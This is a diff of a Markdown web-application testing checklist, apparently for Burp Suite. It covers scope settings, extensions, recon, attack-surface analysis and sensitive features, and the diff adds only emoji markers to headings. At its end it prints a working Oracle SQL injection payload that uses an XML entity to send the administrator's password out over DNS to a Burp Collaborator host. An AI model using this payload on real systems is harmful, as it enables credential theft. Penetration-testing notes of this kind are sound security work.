@@ -1,11 +1,11 @@
 # Configure
-## General settings
+## :o: General settings
 ### Scope
 - Configure **HTTP Proxy** to _show_ in-scope items only
 - Configure **Logger** to _capture_ in-scope items only
 - Configure **Logger** to _show_ in-scope items only
 
-## Extensions
+## :o: Extensions
 The follwing extensions may be useful :
 - Authorize
 - Upload scanner
@@ -49,7 +49,7 @@ This will add web pages on the _Target_ tab.
 
 An alternative recon should be done with different file extensions.
 
-## Step 2 - Analyze the attack surface
+## :o: Step 2 - Analyze the attack surface
 ### :white_check_mark: Analyze refrences (URLs found in code)
 On the _Target_ tab :
 1. Right-click the website root
@@ -80,7 +80,7 @@ Anomalies are suspect behaviors that may or may not be harmful.
 
 ### :white_check_mark: Analyze cookies
 
-## Step 2 - Identify sensitive features
+## :o: Step 2 - Identify sensitive features
 ### Password
 - Password reset
 - Password change
@@ -88,7 +88,7 @@ Anomalies are suspect behaviors that may or may not be harmful.
 ### User data
 - Email change
 
-## Step 3 - Identify vulnrabilities
+## :o: Step 3 - Identify vulnrabilities
 ### :white_check_mark: SQL injections
 #### DNS exfiltration
 Oracle - `'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % bjgsg SYSTEM "http://'||(select password from users where username='administrator')||'.8clatdya2m9x02ta9zxozvbmyd44svgk.oastify.com/">%bjgsg;]>'),'/l') from dual)||'`
